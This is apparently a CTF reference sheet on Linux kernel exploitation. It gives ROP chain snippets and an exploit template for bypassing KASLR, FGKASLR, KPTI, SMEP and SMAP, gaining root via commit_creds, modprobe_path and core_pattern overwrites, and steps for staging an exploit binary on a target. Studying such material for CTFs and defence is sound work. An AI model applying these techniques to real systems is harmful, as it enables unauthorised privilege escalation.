# CTF Pwn - Kernel Protection Bypass

## KASLR and FGKASLR Bypass

### KASLR via Stack Leak
```c
// Leak kernel text pointer from stack
unsigned long leak[40];
read(fd, leak, sizeof(leak));
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;
```

**Other sources:** `/proc/kallsyms`, `dmesg`, kernel oops messages, UAF reading kernel objects.

### FGKASLR via __ksymtab

FGKASLR randomizes individual functions but `__ksymtab` entries use relative offsets:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

// ROP chain to read ksymtab entry and compute real address
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_addr + kaslr_offset;
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
payload[off++] = kpti_trampoline + kaslr_offset + 22;
// Return to userland to compute resolved address
```

---

## KPTI Bypass Methods

KPTI separates kernel/user page tables. Four bypass approaches:

### Method 1: swapgs_restore Trampoline
```python
kpti_trampoline = 0xffffffff81200f10  # from /proc/kallsyms

# ROP chain after commit_creds
payload[off++] = kpti_trampoline + 22;  # skip register restore, land at swapgs; iretq
payload[off++] = 0;  # RBX
payload[off++] = 0;  # R12
payload[off++] = 0;  # RBP
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

### Method 2: Signal Handler
```c
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigaction(SIGSEGV, &sa, NULL);
// ROP chain calls commit_creds, swapgs; iretq
// Even with wrong page table → SIGSEGV caught → root shell
```

### Method 3: modprobe_path via ROP
Overwrite `modprobe_path` directly from kernel ROP chain. No KPTI handling needed — write happens entirely in kernel context.

### Method 4: core_pattern via ROP
Similar to Method 3 but overwrites `core_pattern` with `|/tmp/evil`. Any crash triggers the piped program as root.

---

## SMEP / SMAP Bypass

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland code from kernel | Kernel ROP (kROP) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | ret2usr — call userland privesc function directly |

---

## GDB Kernel Debugging

```bash
# Inside QEMU VM (as root)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# In GDB
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite
(gdb) c
(gdb) x/20xg $rsp-0x90
```

---

## Initramfs Workflow

**Virtio-9p shared directory:**
```bash
# QEMU launch
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside VM
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# Host: compile exploit
gcc exploit.c -static -o ./share/exploit
```

**Extract/modify initramfs:**
```bash
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv
# Modify /init for debugging (keep root, disable restrictions)
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

---

## Symbol Finding Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols. Data symbols need `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**
```bash
# 1. Get call_usermodehelper_setup from /proc/kallsyms
# 2. GDB breakpoint, trigger, check first argument (RDI)
hb *0xffffffff810c8c80
# Trigger via: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x
(gdb) p/x $rdi  # → 0xffffffff8265ff00
(gdb) x/s $rdi  # → "/sbin/modprobe"
```

---

## Exploit Templates

### Full Kernel ROP (SMEP + KPTI)
```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long prepare_kernel_cred, commit_creds;
unsigned long pop_rdi_ret, mov_rdi_rax_pop_ret, kpti_trampoline;
unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state() {
    __asm__(
        "mov %[cs], cs; mov %[ss], ss; mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        : [cs]"=r"(user_cs), [ss]"=r"(user_ss),
          [sp]"=r"(user_sp), [rflags]"=r"(user_rflags));
}

void privesc() {
    // ROP chain
}

int main() {
    save_state();
    int fd = open("/dev/vuln", O_RDWR);
    // Leak, calculate offsets, send exploit
    return 0;
}
```

### ret2usr (No SMEP/SMAP)
Direct call to `prepare_kernel_cred(0)` → `commit_creds(result)` from userland, then `swapgs; iretq`.

---

## Exploit Delivery

```bash
# Compile with musl (smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c
strip exploit

# Compress for transfer
gzip exploit && base64 exploit.gz > exploit.b64
# On target: base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit
```
